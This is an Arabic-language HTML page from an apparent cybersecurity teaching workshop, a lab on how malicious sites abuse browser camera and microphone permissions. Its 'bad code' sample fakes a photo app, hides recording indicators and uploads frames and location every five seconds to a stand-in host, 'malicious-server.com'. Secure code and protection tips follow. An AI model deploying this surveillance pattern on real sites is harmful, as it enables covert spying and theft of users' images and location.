<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ูุฎุชุจุฑ 05: ุงููุตูู ูููุงููุฑุง | ูุฑุดุฉ ูููุฏุณูู ุงููุณุชูุจู</title><link rel="stylesheet" href="../css/styles.css"><link rel="stylesheet" href="../css/animations.css"><link rel="stylesheet" href="../css/labs.css"><link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;700&family=Source+Code+Pro:wght@400;600&display=swap" rel="stylesheet"><!-- Arabic Fonts --><link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=Tajawal:wght@400;500;700&family=Noto+Sans+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="../css/arabic-fixes.css"><style>
        /* Arabic RTL Support */
        html[lang="ar"] {
            direction: rtl;
            text-align: right;
        }
        
        html[lang="ar"] body {
            font-family: 'Cairo', 'Tajawal', 'Noto Sans Arabic', sans-serif !important;
            direction: rtl;
            text-align: right;
        }
        
        html[lang="ar"] .message-text,
        html[lang="ar"] .lab-description,
        html[lang="ar"] .slide-body p,
        html[lang="ar"] .hint,
        html[lang="ar"] h1, h2, h3, h4, h5, h6 {
            direction: rtl;
            text-align: right;
            unicode-bidi: embed;
        }
        
        html[lang="ar"] input[type="text"],
        html[lang="ar"] textarea {
            direction: rtl;
            text-align: right;
        }
        
        html[lang="ar"] .nav-back {
            float: right;
        }
        
        html[lang="ar"] .labs-grid,
        html[lang="ar"] .ai-labs-grid {
            direction: rtl;
        }
        
        html[lang="ar"] .quick-prompts,
        html[lang="ar"] .capability-item,
        html[lang="ar"] .option-group {
            text-align: right;
        }
        
        /* Fix button alignment for RTL */
        html[lang="ar"] .genre-buttons,
        html[lang="ar"] .setting-buttons,
        html[lang="ar"] .style-buttons {
            justify-content: flex-end;
        }
        
        /* Ensure proper Arabic text rendering */
        html[lang="ar"] * {
            font-kerning: auto;
            text-rendering: optimizeLegibility;
            -webkit-font-feature-settings: "kern" 1, "liga" 1, "calt" 1;
            font-feature-settings: "kern" 1, "liga" 1, "calt" 1;
        }
    </style></head><body><div class="lab-grid-bg"></div><div class="cyber-particles"></div><!-- Language Toggle --><nav class="lab-nav"><a href="../cyber-home.html" class="nav-back"><span>ุงูุนูุฏุฉ ูููุฎุชุจุฑุงุช โ</span></a><h1 class="nav-title"><span>ูุฎุชุจุฑ 05: ุงููุตูู ูููุงููุฑุง</span></h1><div class="lab-timer">00:00:00</div></nav><main class="lab-container"><!-- View Toggle --><div class="view-toggle"><button class="toggle-btn active" onclick="switchView('hacker')"><span class="icon">๐</span><span>ุนุฑุถ ุงููุงูุฑ</span></button><button class="toggle-btn" onclick="switchView('developer')"><span class="icon">๐ก๏ธ</span><span>ุนุฑุถ ุงููุทูุฑ</span></button></div><!-- Lab Introduction --><section class="lab-intro"><h2 class="section-header"><span>ุงุณุชุบูุงู ุฃุฐููุงุช ุงูุฌูุงุฒ</span></h2><p class="lab-description"><span>ููุถุญ ูุฐุง ุงููุฎุชุจุฑ ููู ูููู ููููุงูุน ุงูุถุงุฑุฉ ุงุณุชุบูุงู ุฃุฐููุงุช ุงูุฌูุงุฒ ูููุตูู ุฅูู ุงููุงููุฑุงุช 
                ูุงููููุฑููููุงุช ูุงูุฃุฌูุฒุฉ ุงูุญุณุงุณุฉ ุงูุฃุฎุฑู ุฏูู ูุนู ููุงุณุจ ูู ุงููุณุชุฎุฏู.</span></p><div class="threat-level"><span>ูุณุชูู ุงูุชูุฏูุฏ:</span><div class="threat-bar high"></div><span class="threat-text high"><span>ุนุงูู</span></span></div></section><!-- Hacker View --><section id="hacker-view" class="view-section active"><div class="terminal-header"><span class="terminal-title"><span>ุทุฑููุฉ ุงููุงูุฑ</span></span><div class="terminal-controls"><span class="control red"></span><span class="control yellow"></span><span class="control green"></span></div></div><div class="hacker-content"><div class="scenario-box"><h3><span>๐ ุงูุณููุงุฑูู</span></h3><p><span>ููุฏ ุฃูุดุฃุช ูููุน ููุจ ุถุงุฑ ูุฎุฏุน ุงููุณุชุฎุฏููู ูููุญ ุฃุฐููุงุช ุงููุงููุฑุง ูุงููููุฑูููู.</span></p><p></span><span>ุงููุฏู: <code>ูุณุชุฎุฏููู ุบูุฑ ูุดุชุจููู ูุฒูุฑูู "ุชุทุจูู ุงููุงููุฑุง ุงูููุชุน"</code></span></p></div><div class="exploit-steps"><h3><span>๐ท ุงุณุชุบูุงู ุงููุตูู ููุฌูุงุฒ</span></h3><div class="step"><span class="step-number">01</span><div class="step-content"><h4><span>ุฅุนุฏุงุฏ ุงูููุฏุณุฉ ุงูุงุฌุชูุงุนูุฉ</span></h4><div class="social-setup"><p><span>ุฅูุดุงุก ุทูุจ ูุฒูู ูุจุฏู ุดุฑุนูุงู:</span></p><div class="fake-app-preview"><div class="fake-app-header"><span class="app-icon">๐ธ</span><span class="app-name">PhotoMagic Pro</span></div><p class="fake-description"><span>ุงูุชูุท ุตูุฑ ูุฐููุฉ ุจููุงุชุฑ ุงูุฐูุงุก ุงูุงุตุทูุงุนู!</span></p><button onclick="requestCameraAccess()" class="fake-allow-btn"><span>๐ท ุงูุณูุงุญ ุจุงููุตูู ูููุงููุฑุง</span></button></div></div></div></div><div class="step"><span class="step-number">02</span><div class="step-content"><h4><span>ุญุตุงุฏ ุงูุฃุฐููุงุช</span></h4><div class="permission-status" id="permission-status"><div class="permission-item"><span class="permission-name">๐ท ุงููุงููุฑุง</span><span class="permission-state" id="camera-state">ูู ูุชู ุงูุทูุจ</span></div><div class="permission-item"><span class="permission-name">๐ค ุงููููุฑูููู</span><span class="permission-state" id="microphone-state">ูู ูุชู ุงูุทูุจ</span></div><div class="permission-item"><span class="permission-name">๐ ุงููููุน</span><span class="permission-state" id="location-state">ูู ูุชู ุงูุทูุจ</span></div></div><button onclick="requestAllPermissions()" class="cyber-btn">
                                ๐ฏ ุทูุจ ุฌููุน ุงูุฃุฐููุงุช
                            </button></div></div><div class="step"><span class="step-number">03</span><div class="step-content"><h4><span>ูุญุงูุงุฉ ุงููุฑุงูุจุฉ</span></h4><div class="surveillance-panel"><div class="camera-feed"><video id="camera-preview" autoplay muted></video><div class="camera-overlay"><div class="recording-indicator" id="recording-indicator"><span class="red-dot"></span><span>ุชุณุฌูู</span></div><div class="camera-info"><div><span>ุงูุฏูุฉ:</span><span id="resolution">N/A</span></div><div><span>ูุนุฏู ุงูุฅุทุงุฑุงุช:</span><span id="fps">N/A</span></div></div></div></div><div class="surveillance-controls"><button onclick="startSurveillance()" class="cyber-btn" id="surveillance-btn"><span>๐ด ุจุฏุก ุงููุฑุงูุจุฉ</span></button><button onclick="captureFrame()" class="cyber-btn" id="capture-btn" disabled><span>๐ธ ุงูุชูุงุท ุฅุทุงุฑ</span></button><button onclick="toggleAudio()" class="cyber-btn" id="audio-btn" disabled><span>๐ค ูุฑุงูุจุฉ ุงูุตูุช</span></button></div></div></div></div><div class="step"><span class="step-number">04</span><div class="step-content"><h4><span>ุงุณุชุฎุฑุงุฌ ุงูุจูุงูุงุช</span></h4><div class="exfiltration-panel"><div class="captured-data" id="captured-data"><div class="data-header"><span>๐ ุงูุจูุงูุงุช ุงููุญุตูุฏุฉ</span></div><div class="data-list" id="data-list"><p class="no-data"><span>ูู ูุชู ุงูุชูุงุท ุฃู ุจูุงูุงุช ุจุนุฏ...</span></p></div></div><div class="exfil-stats"><div class="stat"><span class="label"><span>ุงูุฅุทุงุฑุงุช ุงููุญุตูุฏุฉ:</span></span><span id="frame-count">0</span></div><div class="stat"><span class="label"><span>ุนููุงุช ุงูุตูุช:</span></span><span id="audio-count">0</span></div><div class="stat"><span class="label"><span>ุชุญุฏูุซุงุช ุงููููุน:</span></span><span id="location-count">0</span></div></div></div></div></div></div><div class="success-indicator" id="success-indicator"><span class="icon">๐๏ธ</span><span><span>ุงููุฑุงูุจุฉ ูุดุทุฉ!</span></span></div></div></section><!-- Developer View --><section id="developer-view" class="view-section"><div class="terminal-header"><span class="terminal-title"><span>ุทุฑููุฉ ุงููุทูุฑ</span></span><div class="terminal-controls"><span class="control red"></span><span class="control yellow"></span><span class="control green"></span></div></div><div class="developer-content"><div class="vulnerability-explanation"><h3><span>๐ ุซุบุฑุงุช ุฃุฐููุงุช ุงูุฌูุงุฒ</span></h3><p><span>ุชููุฑ ุงููุชุตูุญุงุช ุงูุญุฏูุซุฉ ูุงุฌูุงุช ุจุฑูุฌุฉ ูููุฉ ูููุตูู ุฅูู ุฃุฌูุฒุฉ ุงูุฌูุงุฒุ ููู ูููู ุงุณุชุบูุงููุง:</span></p><div class="vulnerable-code"><h4><span>โ ููุฏ ุถุงุฑ</span></h4><pre class="code-block language-javascript">
// ุณูุก: ุทูุจุงุช ุฃุฐููุงุช ุฎุงุฏุนุฉ
function requestCameraAccess() {
    // ุงูุชููุฑ ุจุฒู ุชุทุจูู ุดุฑุนู
    document.title = "PhotoMagic Pro - ุฌุงุฑู ุงูุชุญููู...";
    
    // ุทูุจ ุงูุฃุฐููุงุช ุจุฏูุน ุบุฑุถ ูุงุถุญ
    navigator.mediaDevices.getUserMedia({
        video: { 
            width: 1920, 
            height: 1080,
            facingMode: "user"
        },
        audio: true
    }).then(stream => {
        // ุจุฏุก ุงูุชุณุฌูู ุจุฏูุน ุนูู ุงููุณุชุฎุฏู
        const video = document.getElementById('hiddenVideo');
        video.srcObject = stream;
        
        // ุฅุฑุณุงู ุงูุจูุงูุงุช ุฅูู ุฎุงุฏู ุงูููุงุฌู
        recordAndUpload(stream);
        
        // ุฅุฎูุงุก ุญูููุฉ ุฃู ุงููุงููุฑุง ูุดุทุฉ
        hideRecordingIndicators();
    });
}

// ุงูุชูุงุท ุงูุฅุทุงุฑุงุช ุจุงุณุชูุฑุงุฑ
function recordAndUpload(stream) {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    setInterval(() => {
        // ุชูุงุท ุฅุทุงุฑ ูู 5 ุซูุงูู
        ctx.drawImage(video, 0, 0);
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        // ุฅุฑุณุงู ุฅูู ุฎุงุฏู ุงูููุงุฌู
        fetch('https://malicious-server.com/upload', {
            method: 'POST',
            body: JSON.stringify({
                image: imageData,
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                location: getCurrentLocation()
            })
        });
    }, 5000);
}</pre></div></div><div class="secure-implementation"><h3>๐ก๏ธ SECURE IMPLEMENTATION</h3><div class="secure-code"><h4>โ SECURE CODE</h4><pre class="code-block language-javascript">
// ุฌูุฏ: ูุนุงูุฌุฉ ุฃุฐููุงุช ุดูุงูุฉ
class SecureMediaHandler {
    constructor() {
        this.stream = null;
        this.isRecording = false;
        this.userConsent = false;
    }
    
    async requestPermissions() {
        // ุดุฑุญ ูุงุถุญ ููุง ุณูุชู ุงููุตูู ุฅููู
        const consent = await this.showConsentDialog({
            title: "ูุทููุจ ุงููุตูู ูููุงููุฑุง",
            message: "ูุญุชุงุฌ ูุฐุง ุงูุชุทุจูู ูููุตูู ูููุงููุฑุง ูุงูุชูุงุท ุงูุตูุฑ. ุฎุตูุตูุชู ูุญููุฉ:",
            details: [
                "โข ูุชู ุงูุชูุงุท ุงูุตูุฑ ููุท ุนูุฏ ููุฑ ุฒุฑ ุงูุชูุงุท",
                "โข ูุง ูุชู ุฅุฑุณุงู ุงูุจูุงูุงุช ูุฎูุงุฏู ุฎุงุฑุฌูุฉ",
                "โข ููููู ุฅูุบุงุก ุงููุตูู ูู ุฃู ููุช",
                "โข ูุคุดุฑ ุงูุชุณุฌูู ุณูุธูุฑ ุฏุงุฆูุงู"
            ]
        });
        
        if (!consent) {
            throw new Error('ุฑูุถ ุงููุณุชุฎุฏู ุงูููุงููุฉ');
        }
        
        try {
            // ุทูุจ ุงูุญุฏ ุงูุฃุฏูู ูู ุงูุฃุฐููุงุช ุงูุถุฑูุฑูุฉ
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 640 },
                    height: { ideal: 480 },
                    facingMode: "user"
                },
                audio: false // ุทูุจ ููุท ุนูุฏ ุงูุญุงุฌุฉ ุงููุนููุฉ
            });
            
            this.userConsent = true;
            this.showPermissionStatus();
            return this.stream;
            
        } catch (error) {
            this.handlePermissionError(error);
            throw error;
        }
    }
    
    showPermissionStatus() {
        // Always show clear indicators
        const indicator = document.createElement('div');
        indicator.className = 'camera-active-indicator';
        indicator.innerHTML = `
            <div class="indicator-content"><span class="camera-icon">๐ท</span><span>Camera Active</span><button onclick="this.revokePermissions()">Stop</button></div>
        `;
        document.body.appendChild(indicator);
    }
    
    capturePhoto() {
        if (!this.userConsent || !this.stream) {
            throw new Error('No permission or stream available');
        }
        
        // Only capture when explicitly requested
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const video = document.getElementById('videoElement');
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        
        // Process locally, don't upload automatically
        return canvas.toDataURL('image/jpeg', 0.9);
    }
    
    revokePermissions() {
        if (this.stream) {
            // Stop all tracks
            this.stream.getTracks().forEach(track => track.stop());
            this.stream = null;
        }
        
        this.userConsent = false;
        this.removeIndicators();
        
        // Clear any stored data
        this.clearCapturedData();
    }
}</pre></div><div class="security-measures"><h4>๐ PROTECTION STRATEGIES</h4><div class="protection-grid"><div class="protection-card"><h5>Permission Transparency</h5><ul><li>Clear explanation of data usage</li><li>Visible recording indicators</li><li>Easy revocation options</li></ul></div><div class="protection-card"><h5>Minimal Access Principle</h5><ul><li>Request only necessary permissions</li><li>Use lowest required quality</li><li>Limit access duration</li></ul></div><div class="protection-card"><h5>User Control</h5><ul><li>Explicit consent for each use</li><li>Clear stop/revoke buttons</li><li>No background recording</li></ul></div><div class="protection-card"><h5>Data Protection</h5><ul><li>Local processing when possible</li><li>Encrypted transmission if needed</li><li>No unauthorized storage</li></ul></div></div></div></div><div class="user-protection"><h3>๐ก๏ธ USER PROTECTION GUIDE</h3><div class="protection-tips"><div class="tip-item"><span class="icon">๐</span><strong>Check URL Bar:</strong><p>Look for camera/microphone icons indicating active access</p></div><div class="tip-item"><span class="icon">โ๏ธ</span><strong>Browser Settings:</strong><p>Review and manage site permissions regularly</p><code>chrome://settings/content/camera</code></div><div class="tip-item"><span class="icon">๐ซ</span><strong>Default Deny:</strong><p>Set browser to ask for permission every time</p></div><div class="tip-item"><span class="icon">๐ฑ</span><strong>Mobile Awareness:</strong><p>Mobile browsers also request device permissions</p></div></div></div><div class="browser-security"><h3>๐ BROWSER SECURITY FEATURES</h3><div class="security-features"><div class="feature"><h5>Permission Prompts</h5><p>Modern browsers always ask before granting camera/microphone access</p></div><div class="feature"><h5>Visual Indicators</h5><p>Camera/microphone icons appear in address bar when active</p></div><div class="feature"><h5>HTTPS Requirement</h5><p>Device access APIs only work on secure (HTTPS) connections</p></div><div class="feature"><h5>Permission Management</h5><p>Users can revoke permissions at any time through browser settings</p></div></div></div></div></section><!-- Lab Progress --><div class="lab-progress"><div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div><div class="progress-steps"><div class="step-indicator active">Setup</div><div class="step-indicator">Request</div><div class="step-indicator">Access</div><div class="step-indicator">Protect</div></div></div></main><script src="../js/lab-common.js"></script><script src="../js/lab5-camera.js"></script></body></html> 